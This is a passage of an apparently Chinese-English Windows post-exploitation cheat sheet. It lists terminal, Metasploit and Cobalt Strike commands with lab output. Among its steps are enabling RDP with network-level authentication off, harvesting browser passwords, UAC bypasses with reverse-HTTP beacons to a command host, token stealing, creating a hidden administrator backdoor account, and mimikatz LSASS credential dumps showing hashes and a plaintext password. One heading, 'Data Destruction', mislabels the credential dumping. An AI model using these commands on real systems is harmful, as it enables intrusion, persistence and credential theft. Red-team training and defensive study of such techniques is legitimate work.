net start TermService
```
```shell

PS C:\Users\Administrator\Desktop\powrshell> REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\
RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
操作成功完成。
PS C:\Users\Administrator\Desktop\powrshell> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serve
r" /v fDenyTSConnections /t REG_DWORD /d 0 /f
操作成功完成。
PS C:\Users\Administrator\Desktop\powrshell> net start TermService
请求的服务已经启动。

请键入 NET HELPMSG 2182 以获得更多的帮助。

```

####　msf下操作：

> post/windows/manage/enable_rdp

```
msf5 post(windows/manage/enable_rdp) > exploit 

[*] Enabling Remote Desktop
[*] 	RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[*] 	Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20190907201411_default_192.168.2.114_host.windows.cle_731683.txt
[*] Post module execution completed

```

#### cs下操作：

```
shell REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
shell net start TermService

explore --> desktop

```

## Credentials in Files(在文件中获取凭证)

### Collect passwords from web browsers（在浏览器中获取密码）

https://github.com/AlessandroZ/LaZagne

https://github.com/hassaanaliw/chromepass

#### terminal下操作：

>  laZagne.exe browsers [-f]

```
PS C:\Users\Administrator\Desktop\powrshell> C:\Users\Administrator\Desktop\lazagne.exe browsers -f

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for a02f012c-b6ff-48b9-8b07-5a2ea73628d6
[+] System masterkey decrypted for 56e7df96-74cb-45af-95ed-f15706dcff3e

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.952999830246
```
## System Information Discovery(系统信息发现)

### Get Windows version（windows版本获取）

#### terminal下操作：

> ver

```
C:\Users\Administrator\Desktop\powrshell>ver

Microsoft Windows [版本 10.0.17763.593]

```

#### cs下操作：

> shell ver

### Print environment variables(环境变量输出)

#### terminal下操作：

> set

```
C:\Users\Administrator\Desktop\powrshell>set
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=DESKTOP-QQF0MLN
ComSpec=C:\Windows\system32\cmd.exe
DriverData=C:\Windows\System32\Drivers\DriverData
FPS_BROWSER_APP_PROFILE_STRING=Internet Explorer
FPS_BROWSER_USER_PROFILE_STRING=Default
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\DESKTOP-QQF0MLN
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\Program Files (x86)\NetSarang\Xftp 6\;C:\Program Files (x86)\NetSarang\Xshell 6\;C:\Program Files
iles\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\Win
v1.0\;C:\python3;C:\python3\Scripts;C:\Python27;C:\Python27\Scripts;C:\python3\Scripts\;C:\python3\;C:\Us
or\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 158 Stepping 10, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=9e0a
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShel
ndows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp
TMP=C:\Users\ADMINI~1\AppData\Local\Temp
USERDOMAIN=DESKTOP-QQF0MLN
USERDOMAIN_ROAMINGPROFILE=DESKTOP-QQF0MLN
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows

```

#### cs下操作：

> shell set

### Get computer information(computer信息获取)

#### terminal下操作：

> net config workstation
>
> net config server

```
C:\Users\Administrator\Desktop\powrshell>net config workstation
计算机名                     \\DESKTOP-QQF0MLN
计算机全名                   DESKTOP-QQF0MLN
用户名                       Administrator

工作站正运行于
        NetBT_Tcpip_{D56C33AF-9F2F-4E8B-90F2-A5FB6CAA3D90} (000C29D73FB2)

软件版本                     Windows 10 Enterprise LTSC 2019

工作站域                     WORKGROUP
登录域                       DESKTOP-QQF0MLN

COM 打开超时 (秒)            0
COM 发送计数 (字节)          16
COM 发送超时 (毫秒)          250
命令成功完成。


C:\Users\Administrator\Desktop\powrshell>net config server
服务器名称                     \\DESKTOP-QQF0MLN
服务器注释

软件版本                       Windows 10 Enterprise LTSC 2019
服务器正运行于
        NetbiosSmb (DESKTOP-QQF0MLN)
        NetBT_Tcpip_{D56C33AF-9F2F-4E8B-90F2-A5FB6CAA3D90} (DESKTOP-QQF0MLN)


服务器已隐藏                   No
登录的用户数量上限             20
每个会话打开的文件数量上限     16384

空闲的会话时间 (分)            15
命令成功完成。


```

#### cs下操作：

> shell net config workstation

> shell net config server

### Get configuration information(配置信息获取)

#### terminal下操作：

> systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]

![截图_2019-09-07_20-39-48.png](http://ww1.sinaimg.cn/large/007F8GgBly1g6r8jucbt5j30o70lp414.jpg)


#### msf下操作：

> sysinfo
>
> run winenum

```
meterpreter > sysinfo 
Computer        : ROOT-5DE52AC98B
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > run winenum 
[*] Running Windows Local Enumeration Meterpreter Script
[*] New session on 192.168.2.114:1068...
[*] Saving general report to /root/.msf4/logs/scripts/winenum/ROOT-5DE52AC98B_20190907.4112/ROOT-5DE52AC98B_20190907.4112.txt
[*] Output of each individual command is saved to /root/.msf4/logs/scripts/winenum/ROOT-5DE52AC98B_20190907.4112
[*] Checking if ROOT-5DE52AC98B is a Virtual Machine ........
[*] 	This is a VMware Workstation/Fusion Virtual Machine
[*] 	UAC is Disabled
[*] Running Command List ...
[*] 	running command cmd.exe /c set
[*] 	running command ipconfig /displaydns
[*] 	running command arp -a
[*] 	running command netstat -nao
[*] 	running command netstat -vb
[*] 	running command route print
[*] 	running command netstat -ns
[*] 	running command ipconfig /all
[*] 	running command net view
[*] 	running command net accounts
[*] 	running command net view /domain
[*] 	running command net share
[*] 	running command net group
[*] 	running command net user
[*] 	running command net localgroup
[*] 	running command net localgroup administrators
[*] 	running command net group administrators
[*] 	running command netsh firewall show config
[*] 	running command tasklist /svc
[*] 	running command net session
[*] 	running command gpresult /SCOPE COMPUTER /Z
[*] 	running command gpresult /SCOPE USER /Z
[*] Running WMIC Commands ....
[*] 	running command wmic group list
[*] 	running command wmic nteventlog get path,filename,writeable
[*] 	running command wmic useraccount list
[*] 	running command wmic netclient list brief
[*] 	running command wmic share get name,path
[*] 	running command wmic volume list brief
[*] 	running command wmic logicaldisk get description,filesystem,name,size
[*] 	running command wmic service list brief
[*] 	running command wmic netlogin get name,lastlogon,badpasswordcount
[*] 	running command wmic netuse get name,username,connectiontype,localname
[*] 	running command wmic rdtoggle list
[*] 	running command wmic startup list full
[*] 	running command wmic qfe
[*] 	running command wmic product get name,version
[*] Extracting software list from registry
[*] Dumping password hashes...
[*] Hashes Dumped
[*] Getting Tokens...
[*] All tokens have been processed
[*] Done!


```

#### cs下操作：

> shell systeminfo

## Account Discovery(认证枚举)

### Gather more information on targeted users（收集更多的目标用户信息）

#### terminal下操作：


> net user [username] [/domain]

```
C:\Users\Administrator\Desktop\powrshell>net user administrator
用户名                 Administrator
全名
注释                   管理计算机(域)的内置帐户
用户的注释
国家/地区代码          000 (系统默认值)
帐户启用               Yes
帐户到期               从不

上次设置密码           2019-7-14 23:28:47
密码到期               从不
密码可更改             2019-7-14 23:28:47
需要密码               Yes
用户可以更改密码       Yes

允许的工作站           All
登录脚本
用户配置文件
主目录
上次登录               2019-9-7 10:08:43

可允许的登录小时数     All

本地组成员             *Administrators
全局组成员             *None
命令成功完成。


```

#### msf下操作：

> post/windows/gather/enum_ad_users
>
> auxiliary/scanner/smb/smb_enumusers

```
msf5 post(windows/gather/enum_ad_users) > exploit 

[-] Unable to find the domain to query.
[*] Post module execution completed

```

### Query Active Directory for users, groups and permissions(查询Active Directory中的用户、组和权限)

#### terminal下操作：

```
dsquery group "ou=Domain Admins,dc=domain,dc=com"
dsquery user "dc=domain,dc=com"
dsquery * OU="Domain Admins",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description
dsquery * -filter "(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))" -Attr samAccountName mail -Limit 0
dsquery * -filter "(&(objectCategory=group)(name=*Admin*))" -Attr name description members

```

## Bypass User Account Control

### bypass UAC

#### msf下操作：

> exploit/windows/local/bypassuac
>
> exploit/windows/local/bypassuac_injection
>
> exploit/windows/local/bypassuac_vbs

```shell

msf5 exploit(windows/local/bypassuac) > exploit 

[*] Started reverse TCP handler on 192.168.2.103:4444 
[-] Exploit aborted due to failure: none: Already in elevated state
[*] Exploit completed, but no session was created.


msf5 exploit(windows/local/bypassuac_injection) > exploit 

[*] Started reverse TCP handler on 192.168.2.103:4444 
[-] Exploit aborted due to failure: none: Already in elevated state
[*] Exploit completed, but no session was created.


msf5 exploit(windows/local/bypassuac_vbs) > exploit 

[*] Started reverse TCP handler on 192.168.2.103:4444 
[-] Exploit aborted due to failure: none: Already in elevated state
[*] Exploit completed, but no session was created.

```

#### cs下操作：

> access -->  elevate

```
beacon> elevate uac-dll test
[*] Tasked beacon to spawn windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity process
[+] host called home, sent: 101435 bytes
[+] received output:
[*] Wrote hijack DLL to 'C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\9970.dll'
[-] Privileged file copy failed: C:\WINDOWS\System32\sysprep\CRYPTBASE.dll

beacon> elevate uac-eventvwr test
[*] Tasked Beacon to run windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity context
[+] host called home, sent: 2798 bytes
[+] host called home, sent: 2498 bytes
[+] host called home, sent: 125001 bytes
[-] could not spawn C:\WINDOWS\system32\rundll32.exe (token): 1349
[-] Could not connect to pipe: 2

beacon> elevate uac-token-duplication test
[+] host called home, sent: 3545 bytes
[*] Tasked beacon to spawn windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity process (token duplication)
[+] host called home, sent: 79378 bytes
[+] received output:
[-] You're already in a high integrity context.


beacon> elevate uac-wscript test
[*] Tasked Beacon to run windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity context
[+] host called home, sent: 2802 bytes
[+] host called home, sent: 128999 bytes
[-] could not spawn C:\WINDOWS\system32\rundll32.exe (token): 1349
[-] Could not connect to pipe: 2

```
## Access Token Manipulation(访问令牌操作)

原理：

```
Adversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.

简单来说就是攻击者可以使用访问令牌在不同的用户或系统安全上下文中操作，以执行操作和逃避检测。攻击者可以使用内置的Windows API函数从现有进程复制访问令牌;这就是所谓的令牌窃取

常用方法：

` 令牌模拟/盗窃
` 使用令牌创建进程
` Make和Impersonate令牌

注：任何标准用户都可以使用runas命令和Windows API函数创建模拟令牌;它不需要访问管理员帐户

```

### Token stealing（令牌窃取）

#### msf下操作：

```
use incognito
list_tokens -u
impersonate_token DOMAIN\\User
or:
steal_token {pid}

```
```
meterpreter > use incognito 
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
ROOT-5DE52AC98B\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON


```

#### cs下操作：

> steal_token pid

```
beacon> steal_token 1228
[*] Tasked beacon to steal token from PID 1228
[+] host called home, sent: 12 bytes

```

## Network Share Discovery (网络共享发现)

### Dump network shared resource information（输出网络共享资源信息）

#### terminal下操作：

> net share

```
C:\Users\Administrator\Desktop\powrshell>net share

共享名       资源                            注解

-------------------------------------------------------------------------------
C$           C:\                             默认共享
D$           D:\                             默认共享
IPC$                                         远程 IPC
ADMIN$       C:\Windows                      远程管理
命令成功完成。
```

#### msf下操作：

> auxiliary/scanner/smb/smb_enumshares

```
msf5 auxiliary(scanner/smb/smb_enumshares) > exploit 

[-] 192.168.2.114:139     - Login Failed: Unable to Negotiate with remote host
[*] 192.168.2.114:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

#### cs下操作：

> shell net share

### List of workstations and network devices(工作组和网络设备列表)

#### terminal下操作：

> net view \\host /all [/domain:domain]

```
C:\Users\Administrator\Desktop\powrshell>net view /all
发生系统错误 6118。

此工作组的服务器列表当前无法使用

```

#### msf下操作：

> auxiliary/scanner/smb/smb_enumshares

#### cs下操作：

> net view \\host /domain

## Create Account(创建认证)

### Create backdoor user account（创建后门用户帐户）

#### terminal下操作：

```
net user support_388945a0 somepasswordhere /add /y
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add

```

```
C:\Users\Administrator\Desktop\powrshell>net user support_388945a0 somepasswordhere /add /y
命令成功完成。


C:\Users\Administrator\Desktop\powrshell>net localgroup administrators support_388945a0 /add
命令成功完成。


C:\Users\Administrator\Desktop\powrshell>net localgroup "remote desktop users"
别名     remote desktop users
注释     此组中的成员被授予远程登录的权限

成员

-------------------------------------------------------------------------------
命令成功完成。


C:\Users\Administrator\Desktop\powrshell>support_388945a0 /add
'support_388945a0' 不是内部或外部命令，也不是可运行的程序
或批处理文件。

C:\Users\Administrator\Desktop\powrshell>net user

\\DESKTOP-QQF0MLN 的用户帐户

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
support_388945a0         WDAGUtilityAccount
命令成功完成。

```

#### msf下操作：

> post/windows/manage/add_user_domain

```
msf5 post(windows/manage/add_user_domain) > exploit 

[*] Running module on ROOT-5DE52AC98B
[-] This host is not part of a domain.
[*] Post module execution completed

```


#### cs下操作：

```
shell net user support_388945a0 somepasswordhere /add /y
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add

```
### Enable "support_388945a0" account（启用“support_388945a0”账户）

#### terminal下操作：

```
net user support_388945a0 /active:yes
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add

```
#### cs下操作：

```
shell net user support_388945a0 /active:yes
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add

```

## Data Destruction(数据销毁)

### Dump credentials from LSASS（从LSASS转储凭据）

#### cs下操作：

```
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest

```

```shell
beacon> mimikatz !sekurlsa::logonpasswords
[*] Tasked beacon to run mimikatz's !sekurlsa::logonpasswords command
[+] host called home, sent: 841299 bytes
[+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : NETWORK SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-20
	msv :	
	 [00000002] Primary
	 * Username : ROOT-5DE52AC98B$
	 * Domain   : WORKGROUP
	 * LM       : aad3b435b51404eeaad3b435b51404ee
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
	wdigest :	
	 * Username : ROOT-5DE52AC98B$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : root-5de52ac98b$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 333357 (00000000:0005162d)
Session           : Interactive from 0
User Name         : Administrator
Domain            : ROOT-5DE52AC98B
Logon Server      : ROOT-5DE52AC98B
Logon Time        : 2019-9-7 10:15:25
SID               : S-1-5-21-1911985068-4225083820-4011728908-500
	msv :	
	 [00000002] Primary
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * LM       : 44efce164ab921caaad3b435b51404ee
	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
	 * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f
	wdigest :	
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * Password : 123456
	kerberos :	
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * Password : 123456
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-19
	msv :	
	wdigest :	
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 53191 (00000000:0000cfc7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : 
	msv :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ROOT-5DE52AC98B$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-18
	msv :	
	wdigest :	
	kerberos :	
	 * Username : root-5de52ac98b$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	


beacon> mimikatz !sekurlsa::msv
[*] Tasked beacon to run mimikatz's !sekurlsa::msv command
[+] host called home, sent: 841288 bytes
[+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : NETWORK SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-20
	msv :	
	 [00000002] Primary
	 * Username : ROOT-5DE52AC98B$
	 * Domain   : WORKGROUP
	 * LM       : aad3b435b51404eeaad3b435b51404ee
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

Authentication Id : 0 ; 333357 (00000000:0005162d)
Session           : Interactive from 0
User Name         : Administrator
Domain            : ROOT-5DE52AC98B
Logon Server      : ROOT-5DE52AC98B
Logon Time        : 2019-9-7 10:15:25
SID               : S-1-5-21-1911985068-4225083820-4011728908-500
	msv :	
	 [00000002] Primary
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * LM       : 44efce164ab921caaad3b435b51404ee
	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
	 * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-19
	msv :	

Authentication Id : 0 ; 53191 (00000000:0000cfc7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : 
	msv :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ROOT-5DE52AC98B$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-18
	msv :	


beacon> mimikatz !sekurlsa::kerberos
[*] Tasked beacon to run mimikatz's !sekurlsa::kerberos command
[+] host called home, sent: 841293 bytes
[+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : NETWORK SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-20
	kerberos :	
	 * Username : root-5de52ac98b$
	 * Domain   : WORKGROUP
	 * Password : (null)

Authentication Id : 0 ; 333357 (00000000:0005162d)
Session           : Interactive from 0
User Name         : Administrator
Domain            : ROOT-5DE52AC98B
Logon Server      : ROOT-5DE52AC98B
Logon Time        : 2019-9-7 10:15:25
SID               : S-1-5-21-1911985068-4225083820-4011728908-500
	kerberos :	
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * Password : 123456

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-19
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)

Authentication Id : 0 ; 53191 (00000000:0000cfc7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : 
	kerberos :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ROOT-5DE52AC98B$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-18
	kerberos :	
	 * Username : root-5de52ac98b$
	 * Domain   : WORKGROUP
	 * Password : (null)
beacon> mimikatz !sekurlsa::wdigest
[*] Tasked beacon to run mimikatz's !sekurlsa::wdigest command
[+] host called home, sent: 841292 bytes
[+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : NETWORK SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-20
	wdigest :	
	 * Username : ROOT-5DE52AC98B$
	 * Domain   : WORKGROUP
	 * Password : (null)

Authentication Id : 0 ; 333357 (00000000:0005162d)
Session           : Interactive from 0
User Name         : Administrator
Domain            : ROOT-5DE52AC98B
Logon Server      : ROOT-5DE52AC98B
Logon Time        : 2019-9-7 10:15:25
SID               : S-1-5-21-1911985068-4225083820-4011728908-500
	wdigest :	
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * Password : 123456

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-19
	wdigest :	

Authentication Id : 0 ; 53191 (00000000:0000cfc7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : 
	wdigest :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ROOT-5DE52AC98B$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019-9-7 10:11:34
SID               : S-1-5-18
	wdigest :	

```








